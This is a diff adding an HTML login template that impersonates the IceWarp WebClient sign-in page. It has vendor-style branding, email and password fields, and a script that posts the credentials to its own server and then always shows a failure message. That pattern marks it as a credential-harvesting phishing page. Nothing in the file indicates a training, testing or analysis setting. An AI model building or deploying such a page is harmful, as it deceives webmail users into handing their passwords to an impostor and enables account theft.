@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="{{url_for('static', filename='page.css')}}" />5
+    <title>IceWarp WebClient</title>
+</head>
+
+<style>
+    body{
+        background: url("{{url_for('static', filename='login_background.jpg')}}");
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        height: 100dvh;
+        display: flex;
+        justify-content: center;
+        margin-top: 60px;
+}
+
+</style>
+
+<body>
+    <div class="placeholder" id="placeholder-id">
+        <form id="inputForm">
+            <div class="mail-div-contain">
+                <div class="img-language-change">
+                    <img src="{{url_for('static', filename='language.png')}}" alt="">
+                </div>
+                <div class="logo-holder">
+                    <img src="{{url_for('static', filename='login_logo.png')}}" alt="" />
+                    <h2>Sign in to WebClient</h2>
+                </div>
+                <div id="error-message-div" class="error-message-div">
+                    <img src="{{url_for('static', filename='error.png')}}" alt="">
+                </div>
+                <div class="div-input-mail">
+                    <section class="div-section-mail">
+                        <label class="input-label-mail" for="email">
+                            <input id="email" name="email" type="email" required />
+                            <span class="placeholder-text">Email address</span>
+                        </label>
+                    </section> 
+                    <section class="div-section-mail">
+                        <label class="input-label-mail" for="password">
+                            <input id="password" name="password" type="password" required />
+                            <span class="placeholder-text">password</span>
+                        </label>
+                    </section>
+                    <section class="bDiv">
+                        <button type="submit">Sign in</button>
+                    </section>
+                </div>
+            </div>
+        </form>
+
+    </div>
+</body>
+    <script>
+        const form = document.getElementById("inputForm");
+        const errorDisplay = document.getElementById("error-message-div")
+        const contain = document.getElementById("placeholder-id");
+        form.addEventListener("submit", async (e) => {
+            e.preventDefault();
+            const formData = new FormData(form);
+            const response = await fetch("/", {
+                method: "POST",
+                body: formData,
+            });
+
+            const result = await response.json();
+            errorDisplay.style.display = "flex";
+            contain.style.height = "420px";
+        });
+    </script>
+
+</html>
+
